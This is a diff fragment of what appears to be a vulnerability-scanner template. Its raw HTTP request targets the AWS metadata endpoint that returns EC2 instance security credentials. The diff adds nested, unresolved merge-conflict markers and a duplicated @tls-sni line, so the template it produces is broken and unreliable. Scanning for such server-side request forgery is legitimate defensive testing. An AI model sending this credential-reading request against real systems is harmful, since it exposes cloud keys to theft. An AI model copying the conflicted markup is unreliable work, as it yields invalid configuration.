@@ -21,9 +21,13 @@ requests:
 
       - |+
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
         @tls-sni: {{Hostname}}
 >>>>>>> 5d36d276 (add new stuff)
+=======
+        @tls-sni: {{Hostname}}
+>>>>>>> 18ddf72b (add new stuff)
         GET http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
         Host: {{Hostname}}
 
